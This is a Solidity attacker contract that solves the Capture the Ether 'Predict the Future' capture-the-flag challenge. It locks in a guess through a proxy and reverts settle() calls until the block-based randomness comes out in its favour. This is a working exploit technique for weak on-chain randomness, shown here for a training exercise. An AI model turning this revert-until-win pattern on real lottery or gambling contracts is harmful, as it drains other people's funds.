// SPDX-License-Identifier: UNLICENSED
// https://github.com/MrToph/capture-the-ether/blob/master/test/lotteries/predict-the-future.ts
pragma solidity ^0.7.3;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureAttacker {
    IPredictTheFutureChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = IPredictTheFutureChallenge(challengeAddress);
    }

    function lockInGuess(uint8 n) external payable {
        // need to call it from this contract because guesser is stored and checked
        // when settling
        challenge.lockInGuess{value: 1 ether}(n);
    }

    function attack() external payable {
        challenge.settle();

        // MOST IMPORTANT: if we guessed wrong, revert.
        // This is why we should deploy and use this contract as a proxy.
        // If we didn't, we will loose ether locked in the lockInGuess Method and need to lock in again.
        // Contract: https://capturetheether.com/challenges/lotteries/predict-the-future/
        require(challenge.isComplete(), "challenge not completed");
        // return all of it to EOA
        tx.origin.transfer(address(this).balance);
    }

    receive() external payable {}
}
